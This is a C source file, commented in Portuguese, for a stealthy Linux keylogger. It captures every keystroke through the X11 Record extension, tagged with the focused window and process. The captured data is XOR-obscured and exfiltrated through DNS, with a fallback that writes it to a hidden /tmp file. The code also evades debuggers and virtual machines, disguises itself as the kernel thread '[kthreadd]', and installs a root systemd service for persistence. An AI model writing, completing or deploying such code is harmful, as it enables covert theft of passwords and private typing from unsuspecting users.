#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <signal.h>
#include <time.h>
#include <X11/Xlib.h>
#include <X11/Xutil.h>
// #include <X11/extensions/record.h> // Comentado para compilação sem XRecord
#include <sys/prctl.h>

#include "../common/crypto.h"
#include "../common/stealth.h"
#include "../common/network.h"

// Estruturas para captura
typedef struct {
    time_t timestamp;
    int keycode;
    int state; // press/release
    char window_name[256];
    char process_name[64];
} KeyEvent;

static Display* g_display = NULL;
static CryptoBuffer g_buffer = {{0}, 0, {0}, 0};
static int g_running = 1;

// Callback para eventos de teclado
void keyboard_callback(XPointer closure, XRecordInterceptData* data) {
    if (data->category == XRecordFromServer) {
        xEvent* event = (xEvent*)data->data;
        
        if (event->u.u.type == KeyPress || event->u.u.type == KeyRelease) {
            KeyEvent key_event = {0};
            key_event.timestamp = time(NULL);
            key_event.keycode = event->u.u.detail;
            key_event.state = (event->u.u.type == KeyPress) ? 1 : 0;
            
            // Capturar janela ativa
            Window focused_window;
            int revert_to;
            XGetInputFocus(g_display, &focused_window, &revert_to);
            
            if (focused_window != None) {
                char* window_name = NULL;
                if (XFetchName(g_display, focused_window, &window_name) && window_name) {
                    strncpy(key_event.window_name, window_name, 255);
                    XFree(window_name);
                }
                
                // Tentar obter nome do processo
                Atom atom = XInternAtom(g_display, "_NET_WM_PID", True);
                if (atom != None) {
                    Atom actual_type;
                    int actual_format;
                    unsigned long nitems, bytes_after;
                    unsigned char* prop = NULL;
                    
                    if (XGetWindowProperty(g_display, focused_window, atom, 0, 1, False,
                                         XA_CARDINAL, &actual_type, &actual_format,
                                         &nitems, &bytes_after, &prop) == Success && prop) {
                        pid_t pid = *(pid_t*)prop;
                        XFree(prop);
                        
                        char proc_path[256];
                        snprintf(proc_path, sizeof(proc_path), "/proc/%d/comm", pid);
                        
                        FILE* f = fopen(proc_path, "r");
                        if (f) {
                            fgets(key_event.process_name, 63, f);
                            fclose(f);
                            
                            // Remover newline
                            char* nl = strchr(key_event.process_name, '\n');
                            if (nl) *nl = '\0';
                        }
                    }
                }
            }
            
            // Criptografar e armazenar
            if (g_buffer.size + sizeof(KeyEvent) < sizeof(g_buffer.data)) {
                memcpy(g_buffer.data + g_buffer.size, &key_event, sizeof(KeyEvent));
                xor_encrypt(g_buffer.data + g_buffer.size, sizeof(KeyEvent), g_buffer.key, 32);
                g_buffer.size += sizeof(KeyEvent);
            }
            
            // Exfiltrar quando necessário
            if (g_buffer.size > 3500) {
                exfiltrate_dns_real(g_buffer.data, g_buffer.size);
                g_buffer.size = 0;
            }
        }
    }
    
    XRecordFreeData(data);
}

// Backup de exfiltração via arquivo (fallback)
void exfiltrate_backup() {
    char temp_file[256];
    snprintf(temp_file, sizeof(temp_file), "/tmp/.sys_%ld", time(NULL));
    
    FILE* f = fopen(temp_file, "wb");
    if (f) {
        fwrite(g_buffer.data, 1, g_buffer.size, f);
        fclose(f);
        
        // Manter arquivo para coleta posterior
        chmod(temp_file, 0600);
    }
}

// Daemonizar processo
void daemonize() {
    pid_t pid = fork();
    if (pid < 0) exit(1);
    if (pid > 0) exit(0); // Parent exit
    
    if (setsid() < 0) exit(1);
    
    signal(SIGCHLD, SIG_IGN);
    signal(SIGHUP, SIG_IGN);
    
    pid = fork();
    if (pid < 0) exit(1);
    if (pid > 0) exit(0);
    
    umask(0);
    chdir("/");
    
    // Fechar file descriptors
    for (int x = sysconf(_SC_OPEN_MAX); x >= 0; x--) {
        close(x);
    }
    
    // Reabrir stdin, stdout, stderr para /dev/null
    open("/dev/null", O_RDWR); // stdin
    dup(0); // stdout
    dup(0); // stderr
}

// Persistência via systemd
void install_persistence() {
    char service_file[] = "/etc/systemd/system/system-monitor.service";
    char exe_path[256];
    
    if (readlink("/proc/self/exe", exe_path, sizeof(exe_path)) == -1) {
        return;
    }
    
    FILE* f = fopen(service_file, "w");
    if (f) {
        fprintf(f, "[Unit]\n");
        fprintf(f, "Description=System Monitor Service\n");
        fprintf(f, "After=network.target\n\n");
        fprintf(f, "[Service]\n");
        fprintf(f, "Type=simple\n");
        fprintf(f, "ExecStart=%s\n", exe_path);
        fprintf(f, "Restart=always\n");
        fprintf(f, "User=root\n\n");
        fprintf(f, "[Install]\n");
        fprintf(f, "WantedBy=multi-user.target\n");
        fclose(f);
        
        system("systemctl daemon-reload");
        system("systemctl enable system-monitor.service");
        system("systemctl start system-monitor.service");
    }
}

// Esconder processo
void hide_process() {
    // Renomear processo
    extern char** environ;
    char new_name[] = "[kthreadd]";
    
    // Modificar argv[0]
    if (environ && environ[0]) {
        memset(environ[0], 0, strlen(environ[0]));
        strcpy(environ[0], new_name);
    }
    
    // Tentar se esconder do ps
    prctl(PR_SET_NAME, new_name, 0, 0, 0);
}

// Signal handler
void signal_handler(int sig) {
    g_running = 0;
}

int main(int argc, char* argv[]) {
    // Verificações anti-análise
    if (is_debugger_present() || is_virtual_machine()) {
        return 0;
    }
    
    anti_analysis_delay();
    
    // Verificar se já está rodando
    if (access("/tmp/.monitor_lock", F_OK) == 0) {
        return 0;
    }
    
    // Criar lock file
    int lock_fd = open("/tmp/.monitor_lock", O_CREAT | O_WRONLY, 0600);
    if (lock_fd >= 0) {
        close(lock_fd);
    }
    
    // Daemonizar
    daemonize();
    
    // Esconder processo
    hide_process();
    
    // Instalar persistência (se root)
    if (getuid() == 0) {
        install_persistence();
    }
    
    // Inicializar criptografia
    generate_system_key(g_buffer.key, 32);
    
    // Setup signal handlers
    signal(SIGTERM, signal_handler);
    signal(SIGINT, signal_handler);
    
    // Conectar ao X11
    g_display = XOpenDisplay(NULL);
    if (!g_display) {
        return 1;
    }
    
    // Setup X Record Extension
    XRecordClientSpec clients = XRecordAllClients;
    XRecordRange* range = XRecordAllocRange();
    if (!range) {
        XCloseDisplay(g_display);
        return 1;
    }
    
    range->device_events.first = KeyPress;
    range->device_events.last = KeyRelease;
    
    XRecordContext context = XRecordCreateContext(g_display, 0, &clients, 1, &range, 1);
    if (!context) {
        XFree(range);
        XCloseDisplay(g_display);
        return 1;
    }
    
    XFree(range);
    
    // Iniciar captura
    Display* data_display = XOpenDisplay(NULL);
    if (!data_display) {
        XRecordFreeContext(g_display, context);
        XCloseDisplay(g_display);
        return 1;
    }
    
    if (!XRecordEnableContext(data_display, context, keyboard_callback, NULL)) {
        XCloseDisplay(data_display);
        XRecordFreeContext(g_display, context);
        XCloseDisplay(g_display);
        return 1;
    }
    
    // Loop principal
    while (g_running) {
        usleep(100000); // 100ms
    }
    
    // Cleanup
    XRecordDisableContext(g_display, context);
    XRecordFreeContext(g_display, context);
    XCloseDisplay(data_display);
    XCloseDisplay(g_display);
    
    unlink("/tmp/.monitor_lock");
    
    return 0;
}

// Compilar com: gcc -O3 -s -o system-monitor linux_stealth_monitor.c -lX11 -lXext